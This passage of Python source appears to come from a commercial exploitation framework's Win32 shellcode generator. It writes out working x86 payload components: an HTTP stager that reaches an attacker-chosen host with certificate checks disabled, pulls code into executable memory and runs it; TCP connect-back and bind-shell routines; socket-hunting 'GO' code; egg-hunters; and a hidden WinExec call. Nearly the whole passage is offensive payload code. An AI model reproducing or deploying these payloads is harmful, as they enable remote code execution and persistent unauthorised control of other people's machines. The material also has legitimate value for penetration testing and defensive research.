        incl INSTANCE-geteip(%ebx)

        // loadlibrary wininet.dll
        xorl %eax,%eax
        movb $0x2,%ah
        subl %eax,%esp
        movl %esp,%ecx
        pushl %eax
        pushl %ecx
        call *getsystemdirectorya-geteip(%ebx) // XXX: have pre-pend '/' to dll names !
        movl %esp,%esi
findendofsystemroothttp:
        cld // clear direction flag
        lodsb
        test %al,%al
        jnz findendofsystemroothttp
        decl %esi
        mov %esi,%edi
        leal WININETDLL-geteip(%ebx),%esi
strcpyintobufhttp:
        cld // clear direction flag
        lodsb
        stosb
        test %al,%al
        jnz strcpyintobufhttp
        push %esp
        call *loadlibrarya-geteip(%ebx)
        test %eax,%eax
        jnz fullpathworkedhttp
        leal WININETDLL-geteip(%ebx),%eax
        incl %eax
        pushl %eax
        call *loadlibrarya-geteip(%ebx)
fullpathworkedhttp:
"""
        #someday split this out and do a normal loop
        code+="""
        // fill our function table
        pushl $0x001af002 // internetopena
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,internetopena-geteip(%ebx)

        pushl $0x00d78752 // internetopenurla
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,internetopenurla-geteip(%ebx)

        pushl $0x00d78162 // internetreadfile
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,internetreadfile-geteip(%ebx)

        pushl $0x06bbde1a // internetclosehandle
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,internetclosehandle-geteip(%ebx)

        pushl $0x035e2882 // internetsetoptiona
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,internetsetoptiona-geteip(%ebx)

        pushl $0xDAB3DA // httpsendrequesta
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,httpsendrequesta-geteip(%ebx)

        pushl $0xDABBDA // httpopenrequesta 
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,httpopenrequesta-geteip(%ebx)

        pushl $0xD77BBA // internetconnecta
        pushl $0x00070c48 // wininet
        call getfuncaddress
        movl %eax,internetconnecta-geteip(%ebx)
        """

        code += """
//int3

        // InternetOpen("Mozilla", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0)
        // 1. string is at MOZILLA-geteip(%ebx)
        // 2. INTERNET_OPEN_TYPE_PRECONFIG is 0
        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        leal MOZILLA-geteip(%ebx),%esi
        pushl %esi
        call *internetopena-geteip(%ebx)
        movl %eax,INETHANDLE-geteip(%ebx)

//int3

        xorl %eax,%eax
        movl %eax,EXITCOUNT-geteip(%ebx)
        jmp httpLoop // init with one

httpExit:
        pushl %eax
        call *exitthread-geteip(%ebx)

sleepLoopSizeGet:
//int3
        // on error, add 1000 miliseconds and sleep
        pushl EXITCOUNT-geteip(%ebx)
        popl %eax

        // exit thread on the 4th try
        cmpl $4000,%eax
        je httpExit

        addl $1000,%eax
        movl %eax,EXITCOUNT-geteip(%ebx)
        pushl %eax
        call *sleep-geteip(%ebx)

httpLoop:

        // internetconnecta
        pushl $0
        pushl $0
        pushl $3
        pushl $0
        pushl $0
        pushl HTTPPORT-geteip(%ebx)
        leal HTTPHOST-geteip(%ebx),%esi
        pushl %esi
        pushl INETHANDLE-geteip(%ebx)
        call *internetconnecta-geteip(%ebx)

        // hConnect in %eax
        movl %eax,HCONNECT-geteip(%ebx)

        pushl $0
        pushl $FLAGS
        pushl $0
        pushl $0
        pushl $0 // defaults to HTTP/1.0 ?
        leal CLIENTID-geteip(%ebx),%esi
        pushl %esi
        leal GET-geteip(%ebx),%esi
        pushl %esi
        pushl HCONNECT-geteip(%ebx)
        call *httpopenrequesta-geteip(%ebx)

        // hRequest in %eax
        movl %eax,HREQUEST-geteip(%ebx)

        // set timeout to A LOT
        pushl $0x7fffffff
        movl %esp,%esi
        pushl $4
        pushl %esi
        pushl $6
        pushl HREQUEST-geteip(%ebx)
        call *internetsetoptiona-geteip(%ebx)
        popl %eax // restore stack

//SET SSL OPTIONS

        pushl $0x00003380
        movl %esp,%esi
        pushl $4
        pushl %esi
        pushl $31 // INTERNET_OPTION_SECURITY_FLAGS
        pushl HREQUEST-geteip(%ebx)
        call *internetsetoptiona-geteip(%ebx)
        popl %eax // restore stack

        // _itoa size buffer
        subl $16,%esp
        movl %esp,%edi

        pushl $16 // radix
        pushl %edi // *string
        pushl $4 // size we want
        call *_itoa-geteip(%ebx)
        // itoa apparently does not reset stack ..
        movl %edi,%esp

        xorl %ecx,%ecx
        xorl %eax,%eax
findEndOne:
        incl %ecx
        movb (%edi,%ecx,1),%al
        test %eax,%eax
        jnz findEndOne

        // %ecx points at nul byte
        movl $0x0a0d0a0d,(%edi,%ecx,1)
        pushl $0x203a5a53
        // esp is still pointing in front of edi
        movl %esp,%esi
        // add 8 to ecx
        addl $8,%ecx

        pushl $0 // body size
        pushl $0 // body data
        pushl %ecx // headers size
        pushl %esi // headers data
        pushl HREQUEST-geteip(%ebx)
        call *httpsendrequesta-geteip(%ebx)

        // adjust stack
        addl $20,%esp

        test %eax,%eax
        jz sleepLoopSizeGet

        // success reset sleep counter
        xorl %eax,%eax
        movl %eax,EXITCOUNT-geteip(%ebx)

        // read 4 bytes size then valloc that size, read into it, execute, return

        // InternetReadFile(h2, buffer, 1024, &bytesread)
        leal CODELOC-geteip(%ebx),%ecx // using it as a 4 byte buf
        pushl %ecx // &bytesread
        pushl $4 // len is 4
        leal CODELEN-geteip(%ebx),%edi // get direct into len
        pushl %edi
        pushl HREQUEST-geteip(%ebx)
        call *internetreadfile-geteip(%ebx)

        pushl CODELOC-geteip(%ebx)
        popl %ecx
        test %ecx,%ecx
        jz httpLoop // if no len read, jump back to readfile

        // XXX: should check len return here on CODELOC

        // Valloc XXX: do argument push optimisation
        pushl $0x40
        pushl $0x1000
        pushl CODELEN-geteip(%ebx)
        pushl $0
        call *virtualalloc-geteip(%ebx)
        // XXX: should do error check here

        // save code location
        movl %eax,CODELOC-geteip(%ebx)

        // the body data is queued in the self.inbuffer of the HTTP-socket object
mainHttpRead:
        """

        # XXX: STAGE 2 INIT .. if the loop has a client ID
        # XXX: WE MOVE IT TO A FULL DOUBLE GET PROTOCOL
        # XXX: i.e. get(len) get(code) .. so that the http
        # XXX: server does not confused on protocol semantics.

        if args != None and "ID" in args:
            # XXX: have a client ID, full stage 2 code ;)
            devlog("http_mosdef", "CYCLING TO STAGE 2 HTTP-MOSDEF CODE WITH CLIENT ID")

            code += """

        // prevent handle leak
        pushl HCONNECT-geteip(%ebx)
        call *internetclosehandle-geteip(%ebx)
        pushl HREQUEST-geteip(%ebx)
        call *internetclosehandle-geteip(%ebx)

       jmp mainOpenUrl

sleepLoopBodyGet:
//int3
        // on error, add 1000 miliseconds and sleep
        pushl EXITCOUNT-geteip(%ebx)
        popl %eax

        // exit thread on the 4th try
        cmpl $4000,%eax
        je httpExit

        addl $1000,%eax
        movl %eax,EXITCOUNT-geteip(%ebx)
        pushl %eax
        call *sleep-geteip(%ebx)

mainOpenUrl:
        // internetconnecta
        pushl $0
        pushl $0
        pushl $3
        pushl $0
        pushl $0
        pushl HTTPPORT-geteip(%ebx)
        leal HTTPHOST-geteip(%ebx),%esi
        pushl %esi
        pushl INETHANDLE-geteip(%ebx)
        call *internetconnecta-geteip(%ebx)

        // hConnect in %eax
        movl %eax,HCONNECT-geteip(%ebx)

        pushl $0
        pushl $FLAGS
        pushl $0
        pushl $0
        pushl $0 // defaults to HTTP/1.1
        leal CLIENTID-geteip(%ebx),%esi
        pushl %esi
        leal GET-geteip(%ebx),%esi
        pushl %esi
        pushl HCONNECT-geteip(%ebx)
        call *httpopenrequesta-geteip(%ebx)

        // hRequest in %eax
        movl %eax,HREQUEST-geteip(%ebx)

        // set timeout to A LOT
        pushl $0x7fffffff
        movl %esp,%esi
        pushl $4
        pushl %esi
        pushl $6
        pushl HREQUEST-geteip(%ebx)
        call *internetsetoptiona-geteip(%ebx)
        popl %eax // restore stack

//SET SSL OPTIONS

        pushl $0x00003380
        movl %esp,%esi
        pushl $4
        pushl %esi
        pushl $31 // INTERNET_OPTION_SECURITY_FLAGS
        pushl HREQUEST-geteip(%ebx)
        call *internetsetoptiona-geteip(%ebx)
        popl %eax // restore stack

        // push data to send here

        // _itoa size buffer
        subl $16,%esp
        movl %esp,%edi

        pushl $16 // radix
        pushl %edi // *string
        pushl CODELEN-geteip(%ebx) // size we want
        call *_itoa-geteip(%ebx)
        // itoa apparently does not reset stack ..
        movl %edi,%esp

        xorl %ecx,%ecx
        xorl %eax,%eax
findEndTwo:
        incl %ecx
        movb (%edi,%ecx,1),%al
        test %eax,%eax
        jnz findEndTwo

        // %ecx points at nul byte
        movl $0x0a0d0a0d,(%edi,%ecx,1)
        pushl $0x203a5a53
        // esp is still pointing in front of edi
        movl %esp,%esi
        // add 8 to ecx
        addl $8,%ecx

        pushl $0 // body size
        pushl $0 // body data
        pushl %ecx // headers size
        pushl %esi // headers data
        pushl HREQUEST-geteip(%ebx)
        call *httpsendrequesta-geteip(%ebx)

        // adjust stack
        addl $20,%esp

        test %eax,%eax
        jz sleepLoopBodyGet

        // success reset sleep counter
        xorl %eax,%eax
        movl %eax,EXITCOUNT-geteip(%ebx)
        """

        code += """
        // InternetReadFile(h2, buffer, 1024, &bytesread)
mainReadFile:

//int3
        leal CODELEN-geteip(%ebx),%ecx // using it as a 4 byte buf
        pushl %ecx // &bytesread
        pushl CODELEN-geteip(%ebx)
        pushl CODELOC-geteip(%ebx)
        pushl HREQUEST-geteip(%ebx)
        call *internetreadfile-geteip(%ebx)

        pushl CODELEN-geteip(%ebx)
        popl %eax
        test %eax,%eax

        jz mainReadFile

        // close the HREQUEST handle
        pushl HCONNECT-geteip(%ebx)
        call *internetclosehandle-geteip(%ebx)
        pushl HREQUEST-geteip(%ebx)
        call *internetclosehandle-geteip(%ebx)

stageTwo:
        pushl %ebx
        call *CODELOC-geteip(%ebx)
        popl %ebx

        nop

        // free mem to prevent leak
        pushl $0x8000
        pushl $0x0
        pushl CODELOC-geteip(%ebx)
        call *virtualfree-geteip(%ebx)

        jmp httpLoop
        """

        # patch up invalid cert and ssl flags when we need them ..
        if 'URL' in args.keys():
            args['HTTPHOST'] = args['URL'].split('/')[2].split(':')[0]
            args['HTTPPORT'] = args['URL'].split('/')[2].split(':')[1]

            devlog('http_mosdef', 'Parsed out HTTPHOST and HTTPPORT %s:%s from %s' % (args['HTTPHOST'], args['HTTPPORT'], args['URL']))

            url_string = args['URL']
            # the main Inet handle flags
            if 'HTTPS' in url_string.upper():
                code = code.replace('FLAGS', '0x84C03100')
            else:
                code = code.replace('FLAGS', '0x80400100')

        # STRINGS
        strings  = "jmp poststrings\n"
        strings += "MOZILLA:\n.ascii \"Mozilla\"\n.byte 0x00\n"
        strings += "WININETDLL:\n.ascii \"\\wininet.dll\"\n.byte 0x00\n"
        strings += "POST:\n.ascii \"POST\"\n.byte 0x00\n"
        strings += "GET:\n.ascii \"GET\"\n.byte 0x00\n"

        if 'ID' in args.keys():
            strings += "CLIENTID:\n.ascii \"/c/%s\"\n.byte 0x00\n" % args["ID"] # 2nd stage client init
        else:
            strings += "CLIENTID:\n.ascii \"/w\"\n.byte 0x00\n" # first stage client request

        strings += "HTTPHOST:\n.ascii \"%s\"\n.byte 0x00\n" % args["HTTPHOST"]
        self.addVariable("HTTPPORT", long, int(args["HTTPPORT"]))

        strings += "poststrings:\n"
        code += strings


        # KERNEL32.DLL
        self.imports.append("kernel32.virtualalloc")
        self.imports.append("kernel32.virtualfree")
        self.imports.append("kernel32.getsystemdirectorya")
        self.imports.append("kernel32.loadlibrarya")
        self.imports.append("kernel32.sleep")
        self.imports.append("kernel32.exitthread")
        # for SIZES
        self.imports.append("ntdll._itoa")

        for v in ["HTTPHANDLE", "INETHANDLE", "CODELOC", "CODELEN", "EXITCOUNT", "INSTANCE", "HCONNECT", "HREQUEST",\
                  "internetsetoptiona", "internetopena", "internetopenurla", "internetreadfile", "internetclosehandle",\
                  "internetconnecta", "httpopenrequesta", "httpsendrequesta"]:
            self.addVariable(v, long, 0)

        self.code += code
        devlog('http_mosdef', 'returning from shellcode generation')
        return 

    def tcpconnect(self,args):
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        democode="""
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/wceinternet5/html/wce50lrfinternetqueryoption.asp

        internetSettings = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 
!                 'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings')
!             proxyEnable = _winreg.QueryValueEx(internetSettings,
!                                                'ProxyEnable')[0]
!             if proxyEnable:
!                 # Returned as Unicode but problems if not converted to ASCII
!                 proxyServer = str(_winreg.QueryValueEx(internetSettings,
!                                                        'ProxyServer')[0])
!                 if ';' in proxyServer:        # Per-protocol settings
!                     for p in proxyServer.split(';'):
!                         protocol, address = p.split('=')
!                         proxies[protocol] = '%s://%s' % (protocol, address)
        """
        connectcode="""
        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *socket-geteip(%ebx)
        movl %eax,FDSPOT-geteip(%ebx)
        pushl $0x0
        pushl $0x0
        pushl $IPADDRESS
        pushl $PORT
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *connect-geteip(%ebx)
        test %eax,%eax
        jl  exit
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to tcpconnect!!!"
        if "port" not in args:
            print "no port in args of tcpconnect"
        ipaddress=socket.inet_aton(socket.gethostbyname(args["ipaddress"]))
        port=int(args["port"])
        connectcode=connectcode.replace("IPADDRESS", uint32fmt(istr2int(ipaddress)))
        connectcode=connectcode.replace("PORT", uint32fmt(reverseword((0x02000000 | port))))
        self.code+=connectcode
        #self.longs+=["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        self.imports+=["ws2_32.socket","ws2_32.connect"]
        return

    def tcpconnectMulti(self,args):
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        connectcode="""
        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *socket-geteip(%ebx)
        movl %eax,FDSPOT-geteip(%ebx)
        pushl $0x0
        INSERTPORTS
portloop:
        popl %edx
        test %edx,%edx
        jz exit
        movl FDSPOT-geteip(%ebx),%eax
        pushl $0x0
        pushl $0x0
        pushl $IPADDRESS
        pushl %edx
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *connect-geteip(%ebx)
        addl $16,%esp
        test %eax,%eax
        jl  portloop
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to tcpconnect!!!"
        if "ports" not in args:
            print "no ports in args of tcpconnect"
        ipaddress=socket.inet_aton(socket.gethostbyname(args["ipaddress"]))
        ports=args["ports"]

        connectcode=connectcode.replace("IPADDRESS", uint32fmt(istr2int(ipaddress)))
        portscode = ""
        for each in ports:
            port = int(each)
            portscode += ("pushl $0x%s\n        " % uint32fmt(reverseword((0x02000000 | port))))

        connectcode=connectcode.replace("INSERTPORTS", portscode)
        #print connectcode
        self.code+=connectcode
        #self.longs+=["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        self.imports+=["ws2_32.socket","ws2_32.connect"]
        return

    def BindMosdef(self, args):
        """
        uses same handshake function as GOcode
        args takes { "port" : 1234 }
        378 bytes unencoded (including recvexec attribute
        """

        if not self.foundeip:
            self.findeip([0])

        BindMosdefCode="""
        pushl $0x6
        pushl $0x1
        pushl $0x2
        cld
        call *socket-geteip(%ebx)
        movl %eax,FDSPOT-geteip(%ebx)
        pushl $0x0
        pushl $0x0
        pushl $IPADDRESS
        pushl $PORT
        movl %esp,%ecx
        pushl $0x10
        pushl %ecx
        pushl %eax
        call *bind-geteip(%ebx)
        incl %eax
        pushl %eax
        pushl FDSPOT-geteip(%ebx)
        call *listen-geteip(%ebx)
        pushl %eax
        pushl %eax
        pushl FDSPOT-geteip(%ebx)
        call *accept-geteip(%ebx)
        movl %eax,FDSPOT-geteip(%ebx)
        pushl $0x4f4f4f47 //'GOOO'
        movl %esp,%ecx
        pushl $0
        pushl $4
        pushl %ecx
        pushl FDSPOT-geteip(%ebx)
        call *send-geteip(%ebx)
        movl %esp,%ecx
        pushl $0
        pushl $1
        pushl %ecx
        pushl FDSPOT-geteip(%ebx)
        call *recv-geteip(%ebx)
        """

        port = int(args["port"])
        import socket
        BindMosdefCode = BindMosdefCode.replace("PORT", uint32fmt(reverseword((0x02000000 | port))))
        BindMosdefCode = BindMosdefCode.replace("IPADDRESS", "0x00000000") # 0.0.0.0

        self.imports += ["ws2_32.socket", "ws2_32.bind", "ws2_32.listen", "ws2_32.accept", "ws2_32.send", "ws2_32.recv"]
        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)

        self.code += BindMosdefCode
        return

    def exitprocess(self,args):
        if args!=None:
            value=int(args[0])
        else:
            value=0

        code="""
doexitprocess:
        pushl $VALUE
        call *exitprocess-geteip(%ebx)
        """
        code=code.replace("VALUE","%s"%value)

        self.exitcode+=code
        self.imports+=["kernel32.exitprocess"]
        return


    def MessageBeep(self, args):
        code="""
domessagebeep:
"""
        if args==None:
            #-1 for beep tone
            code+="""
            xor %eax, %eax // Clear EAX
            dec %eax //-1 for beep tone
            """
        else:
            value=args[0]
            code+="""movl $VALUE, %eax
            """.replace("VALUE",str(value))
        code+="""
            pushl %eax //tone
            call *messagebeep-geteip(%ebx)
        """
        self.code+=code 
        self.imports+=["user32.messagebeep"]
        return


    def MessageBox(self,args):
        """
        This function takes in a list of arguments
        args[0] is a string
        so you would call it with:
        sc.addAttr("MessageBox", ["HI CANVAS USER"])

        You'll want a findeipnoesp attribute before this attribute

        int MessageBox(      

           HWND hWnd,
           LPCTSTR lpText,
           LPCTSTR lpCaption,
           UINT uType
        );
        """
        if args == None:
            value="HI CANVAS USER"
        else:
            value=args[0]
        code="""
domessagebox:
        xor %eax, %eax // Clear EAX
        pushl %eax     // uType
        pushl %eax     // lpCaption
        leal messageboxarg-geteip(%ebx),%eax
        pushl %eax //lpText
        pushl $0 //hWnd
        call *messageboxa-geteip(%ebx)
        """
        self.stringimports.append(("messageboxarg",value))
        self.code+=code
        self.imports+=["user32.messageboxa"]
        return

    def exitthread(self, args={}):
        value = 0
        close_socket = CanvasConfig["force_disconnect_on_node_exit"]

        code = """
        doexitthread:
        """

        if args != None:
            value = args.get("value", 0)
            close_socket = args.get("closesocket", close_socket)

        if close_socket:
            logging.debug("Adding closesocket to exitthread")
            code += """
            pushl FDSPOT - geteip(%ebx)
            call closesocket - geteip(%ebx)
            """
            #FIX: issue#709
            #miss the import of closesocket, this towards that a node crash on closing canvas
            self.imports += ["ws2_32.closesocket"]

        code += """
        pushl $VALUE
        movl rtlexituserthread-geteip(%ebx),%eax
        test %eax,%eax
        jnz vista_exitthread
        call *exitthread-geteip(%ebx)
vista_exitthread:
        call *%eax
        """

        code = code.replace("VALUE", "%s" % value)
        self.exitcode += code
        self.imports += ["kernel32.exitthread"]
        self.imports += ["ntdll.rtlexituserthread"]
        return

    def terminatethread(self,args):
        if args!=None:
            value=int(args[0])
        else:
            value=0

        code="""
doterminatethread:
        call *getcurrentthread-geteip(%ebx)
        pushl $VALUE
        push %eax
        call *terminatethread-geteip(%ebx)
        """
        code=code.replace("VALUE","%s"%value)
        self.exitcode+=code
        self.imports+=["kernel32.terminatethread"]
        self.imports+=["kernel32.getcurrentthread"]
        return

    def terminateprocess(self,args):
        if args!=None:
            value=int(args[0])
        else:
            value=0

        code="""
doterminateprocess:
        call *getcurrentprocess-geteip(%ebx)
        pushl $VALUE
        push %eax
        call *terminateprocess-geteip(%ebx)
        """
        code=code.replace("VALUE","%s"%value)
        self.exitcode+=code
        self.imports+=["kernel32.terminateprocess"]
        self.imports+=["kernel32.getcurrentprocess"]
        return

    def winexec(self,args):
        if args!=None:
            value=args["command"]
        else:
            devlog("Warning: Exploit tried to use winexec shellcode attribute with no argument!")
            raise StandardError

        code="""
dowinexec:
        pushl $0 //SW_HIDE
        leal winexecarg-geteip(%ebx),%eax
        pushl %eax
        call *winexec-geteip(%ebx)
        """
        self.code+=code
        self.stringimports.append(("winexecarg",value))
        self.imports+=["kernel32.winexec"]
        return

    def SmallSearchCode(self, args):
        tag = 0x40424044
        if args != None and "tag" in args:
            tag = args["tag"]

        code = """
        jmp gethandler
gothandler:
        popl %ebx
        addl $-0x104,%esp
        pushl %ebx
        xorl %eax,%eax
        xorl %ebx,%ebx
        decl %eax
        pushl %eax
        movl %esp,%fs:(%ebx)
        incl %eax //zero out
        movb $0xc,%al
        addl %eax,%esp
        movb $4,%bl
        movl %esp,%fs:(%ebx)
        subl %eax,%esp
        movb $8,%bl
        movl %esp,%fs:(%ebx)

        movw $HITAG,%ax //do string replace stuff on this
        shl $0x10,%eax
        movw $LOTAG,%ax //do string replace stuff on this

// so in this example the tag would be 0x40424044 little endian
// we have to get tricky here, on exception, the frame is saved on the
// on the stack, so we decl %eax, then incl before the compare
// this prevents finding ourself
        xorl %esi,%esi
searchloop:
        decl %eax
        movl (%esi),%ebx
        incl %eax
        cmpl %eax,%ebx
        je found
        incl %esi
        jmp searchloop
found:
        cld // clear direction flag
        lodsl
        call *%esi
gethandler:
        call gothandler

// exception handler goes here
// basically just add a page size to our esi
handler:
        // win2k save stub
        pushl %esi
        pushl %edi
        pushl %ebx

        movl 0x18(%esp),%eax // adjust for save stub pushes (0xc original)
        xorl %ebx,%ebx
        movb $0xa0,%bl
        addl %ebx,%eax
        mov (%eax),%esi
        movb $0x10,%bl
        shl $8,%ebx
        addl %ebx,%esi
        andl $0xfffff001,%esi //clean out low 12 bits (+1 to prevent 0 byte)
        movl %esi,(%eax)
        xorl %eax,%eax

        // win2k restore stub
        popl %ebx
        popl %edi
        popl %esi

        ret

// just for testing
//findme:
//.long 0x40424044
//int3
        """
        # split up the tag in a high and a low word
        hitag = (tag & 0xffff0000L) >> 16
        lotag = (tag & 0x0000ffff)
        #print "[!] searchcode ... hitag: 0x%X / lotag: 0x%X"%(hitag, lotag)
        code = code.replace("HITAG", "0x%X"%hitag)
        code = code.replace("LOTAG", "0x%X"%lotag)
        # main (to find) payload is put into memory like 'tag + shellcode'
        self.code += code
        return

    def SearchCodeSafeSEH(self, args):
        tag = 0x40424044
        vprotect = False
        mod_stack = True	
        start = None
        if args != None:
            if "start" in args:
                try:
                    start = int(args["start"])
                except ValueError:
                    raise Exception("The 'start' argument to Search" + \
                                    "CodeSafeSEH must be Int")    
            if "tag" in args:
                tag = args["tag"]

            if "vprotect" in args:
                try:
                    vprotect = bool(args["vprotect"])
                except ValueError:
                    raise Exception("The 'vprotect' argument to Search" + \
                                    "CodeSafeSEH must be True/False")                                    
            else:
                vprotect = False

            if "mod_stack" in args:
                try:
                    mod_stack = bool(args["mod_stack"])
                except ValueError:
                    raise Exception("The 'mod_stack' argument to Search" + \
                                    "CodeSafeSEH must be True/False")
            else:
                mod_stack = True

        # Thanks for fxxxx for contributing with this code
        if start:
            print start
            init = "movl $0x%x,%%edi" % start
        else:
            init = "xorl %edi, %edi"
            
        code = init
        
        code += """		
search_loop:
.byte 0xF7    
.byte 0xC7
.byte 0xFF
.byte 0x0F
.byte 0x00
.byte 0x00    //test   $0x00000fff, %edi
		jnz	value_test
// page test
		// test this pointer for WRITABILITY!!!!

		xorl %eax, %eax
		movb $0x8, %al
		push %edi
		push $0x1
		push %edi
                movl %esp, %edx
                int $0x2e
		pop %edi
		pop %edi
		pop %edi

		//cmp eax, 0xc0000005
		//je next_page
		//cmp eax, 0xc000000d
		//jnz value_test
                cmp $0x33, %al  // 0xc0000033 is writable pointer return value
		je value_test

//next_page:
		// this pointer is not good, increment to next page
		addl $0x1000, %edi
		jmp search_loop

value_test:
		movl $0xffc, %ecx 

		movw $HITAG, %ax
		shl $0x10, %eax
		movw $LOTAG, %ax
value_test_2:
		cmpw %eax, (%edi) 
		je found_it
		incl %edi
		loop value_test_2

		addl $0x4, %edi
		jmp	search_loop

found_it:
		addl $0x4, %edi	            
	        """

        if vprotect:	    	    
            code += """	  	    
	    pushl %ebx
	    pushl %esi
	    pushl %edi

	    sub $0x20, %esp	    
	    mov %esp, %ebp
	    // Args for ZwVirtualProtectMemory
	    // Ptr for old protection
	    pushl %ebp
	    // New protection 
	    pushl $0x40
	    // Ptr to size to vprotect
	    mov $0x1000, 8(%ebp)
	    lea 8(%ebp), %ebx
	    pushl %ebx
	    // Ptr to address base to vprotect
	    movl %edi, 4(%ebp)
	    lea 4(%ebp), %ebx
	    pushl %ebx
	    // Handle
	    pushl $0xFFffFFff
	    // Return address
	    pushl $0x0

	    // Get OS Major/Minor versions so we can select the 
	    // correct syscall number for ZwVirtualProtectMemory
	    xorl %ebx, %ebx
	    movb $0x30, %bl
	    movl %fs:(%ebx), %ebx
	    leal 0x70(%ebx), %ebx
	    leal 0x34(%ebx), %ebx

	    xorl %edx, %edx
	    movb (%ebx), %dl
	    movb 4(%ebx), %dh

	    // Determine OS and select syscall number
	    xorl %ebx, %ebx
	    movl %edx, %eax

	OS_6X:
	    test $1, %al
	    jnz OS_5X
	    movb %ah, %al
	    test %al, %al
	    jne OS_7
	    movb $0xd2, %bl
	    jmp OS_END

	OS_7:
	    movb $0xd7, %bl
	    jmp OS_END

	OS_5X:
	    movb %ah, %al
	    test %al, %al
	    je PROTECT_END
	    test $1, %al
	    jz OS_2003
	    movb $0x89, %bl
	    jmp OS_END

	OS_2003:
	    movb $0x8f, %bl

	OS_END:	    	    
	    // Get KiFastSystemCall address. If this is 0x0 we may want
	    // to exit gracefully
	    movl $0x7ffe0300, %edx
	    movl (%edx), %edx

	    movl %ebx, %eax
	    call %edx

	PROTECT_END:
	    addl $0x38, %esp
	    pop %edi
	    pop %esi
	    pop %ebx	    
	    """

        if mod_stack:
            code += """
	    // fix up the stackz0r
	    xorl  %eax, %eax
	    movl  %fs:0x4(%eax), %esp
	    sub   $0x100, %esp
	    mov   %esp, %ebp	    
	    """

        code += """jmp %edi"""
        # split up the tag in a high and a low word
        hitag = (tag & 0xffff0000L) >> 16
        lotag = (tag & 0x0000ffff)
        #print "[!] searchcode ... hitag: 0x%X / lotag: 0x%X"%(hitag, lotag)
        code = code.replace("HITAG", "0x%X"%hitag)
        code = code.replace("LOTAG", "0x%X"%lotag) 
        # main (to find) payload is put into memory like '(short) tag + (short) tag + shellcode'
        # just in case.
        self.code += code
        return

    def noexit(self,args):
        self.exitcode=None
        return

    def GOFindSock(self, args):
        """
        Win32 GO code

        main_thread:
            for (socket range):
                create_worker_thread() { set FDSPOT in main_thread };            
            while(FDSPOT == 0x41414141) 
                pass
            RecvExec() or whatever you append
        """
        start = 0x10 - 4
        end = 0x4000

        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        CREATETHREADGOCODE = """
        // a GOcode approach that does not care about 'mystery' sockets
        // and other winsock bs. We createthread every instance
        // ones that fail exitthread, ones that stall..we don't care about

        // for extra redundancy we could set an exception handler in our
        // threads that exitthread on mysterious crashes

        // the thread needs send/recv/exitthread, so we write those at the
        // end of the thread code, and have the threadcode contain a
        // little 'geteip' type thing, pass the socket val in as a var
        // range loop
        //xorl %edx,%edx // start of range

        // set FDSPOT to 0x41414141
        movl $0x41414141,FDSPOT-geteip(%ebx)

        movl $STARTRANGE,%edi
rangeloop:

        addl $4,%edi

        cmpl $ENDRANGE,%edi // end of range
        je endrange

        // copy over the send/recv/exitthread dwords
        // eax is still pointing at end of code
        leal threadcode_functions-geteip(%ebx),%eax
        movl send-geteip(%ebx),%edx
        movl %edx,(%eax)
        movl recv-geteip(%ebx),%edx
        movl %edx,4(%eax)
        movl exitthread-geteip(%ebx),%edx
        movl %edx,8(%eax)
        movl getfiletype-geteip(%ebx),%edx
        movl %edx,0xc(%eax)

        // pass in the memory loc of FDSPOT of the main thread
        leal FDSPOT-geteip(%ebx),%edx
        movl %edx,0x10(%eax)

        //SETBLOCKINGADDWORDS

        // memloc of threadcode:
        leal threadcode-geteip(%ebx),%eax

        // create the thread
        xorl  %edx,%edx
        pushl %edx
        pushl %edx
        pushl %edi // pass socket in as parameter
        pushl %eax // memloc
        pushl %edx
        pushl %edx
        call createthread-geteip(%ebx)

        // close the handle
        pushl %eax
        call closehandle-geteip(%ebx)

        // end range (steps of 4)
        jmp rangeloop

        endrange: // createthreads happen very fast, it's no use checking inside the loop
        movl FDSPOT-geteip(%ebx),%eax
        cmpl $0x41414141,%eax
        jne success
        jmp  endrange
success:
        // do stage 2 like regular GOcode
        // worker thread found correct SOCKET for us :)
        movl %eax,%esi // SOCKET into esi
        movl %eax,%edx // SOCKET into edx for backwards compatibility

        // threadcode_functions is where our code ends so we jmp to that for next attribute
        jmp threadcode_continue
        """

        THREADCODE="""                                                                                              
threadcode:
        jmp endofthreadcode
backtothread:
        popl %ebx // our geteip for send/recv/exitthread
        // what we want our thread to do
        movl 4(%esp),%edi // get the SOCKET value for this thread

        pushl %edi
        call *0xc(%ebx) // ret = getfiletype(socket)
        cmpl $0x3, %eax // Exit if ret != SOCKET_PIPE
        jne   exitme
        // send buf
        pushl $0x4F4F4F47
        movl %esp,%esi

        // push the args
        xorl %eax,%eax
        // flags
        pushl %eax
        // len (1) : UPDATE - 4, so we can check for false positives when we want to (GOOO)
        movb $4,%al
        pushl %eax
        // buf
        pushl %esi
        // fd
        pushl %edi
        // call send
        call *(%ebx) // send("GOOO")
        cmpb $4,%al // check for success send of 4 bytes
        jne exitme

        // succeeded, optionally set the SOCKET to blocking here before we operate on it
        //SETBLOCKINGCODETAG

        // recv
        // push the args
        xorl %eax,%eax
        // flags (MSG_PEEK == 2 if we want it)
        //movb $2,%al
        pushl %eax
